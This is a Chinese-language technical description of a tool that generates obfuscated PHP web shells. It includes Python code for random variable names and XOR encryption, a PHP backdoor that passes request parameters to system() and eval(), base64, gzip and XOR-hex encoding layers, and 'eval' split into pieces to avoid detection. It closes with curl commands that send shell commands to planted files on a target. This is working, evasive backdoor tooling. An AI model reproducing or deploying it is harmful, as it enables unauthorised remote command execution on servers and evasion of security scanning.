# WebShell v6 代码生成逻辑说明

## 1. 基本架构

WebShell v6采用了多层加密和混淆的方式来生成PHP后门，主要包含以下几个核心组件：

### 1.1 随机变量生成
```python
def random_var(length=6):
    return ''.join(random.choices(string.ascii_letters, k=length))
```
- 用于生成随机变量名
- 默认长度为6个字符
- 仅使用字母字符，确保变量名合法

### 1.2 XOR加密实现
```python
def xor_encrypt(payload, key):
    return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(payload))
```
- 使用XOR算法对payload进行加密
- 密钥循环使用
- 字符级别的加密

## 2. Payload生成流程

### 2.1 基础payload结构
```php
if(isset($_REQUEST['{param}'])){
    ob_start();
    system($_REQUEST['{param}']);
    $output=ob_get_clean();
    echo $output;
}
```
- 使用ob_start()和ob_get_clean()捕获命令执行输出
- 参数名随机选择（"cmd"/"c"/"x"）
- 使用system()函数执行命令

### 2.2 加密方式
支持三种不同的加密方式：

1. Base64编码
```php
eval(base64_decode("..."));
```

2. Gzip压缩+Base64编码
```php
eval(gzinflate(base64_decode("...")));
```

3. XOR加密+Hex编码
```php
$k="密钥";$d='';$e=hex2bin("加密数据");
for($i=0;$i<strlen($e);$i++){ $d.=$e[$i]^$k[$i%strlen($k)]; }
eval($d);
```

## 3. WebShell模板生成

### 3.1 模板结构
```php
<?php
${var_fn} = "e"."v"."a"."l";  // 拆分eval函数名
${var_data} = $_REQUEST['{param}'] ?? '';  // 获取参数
if(strlen(${var_data}) > 0) {  // 长度检查
    ${var_decoded} = {payload_code}  // 解密执行
}
?>
```

### 3.2 特点
- eval函数名被拆分，避免直接检测
- 使用PHP 7+ 的null合并运算符(??)
- 变量名随机化
- 参数名在整个文件中保持一致

## 4. 使用方法

### 4.1 生成样本
```python
python3 gen_php_webshellv6.py  # 生成100个样本
```

### 4.2 连接方式
```bash
curl -X POST http://target/shell_XX.php -d "c=id"  # 使用c参数
curl -X POST http://target/shell_XX.php -d "cmd=whoami"  # 使用cmd参数
curl -X POST http://target/shell_XX.php -d "x=ls"  # 使用x参数
```

## 5. 安全特性

1. 多层加密
   - Base64
   - Gzip+Base64
   - XOR+Hex

2. 代码混淆
   - 随机变量名
   - 函数名拆分
   - 参数名随机化

3. 输出处理
   - 使用输出缓冲
   - 错误抑制
   - 命令执行结果回显 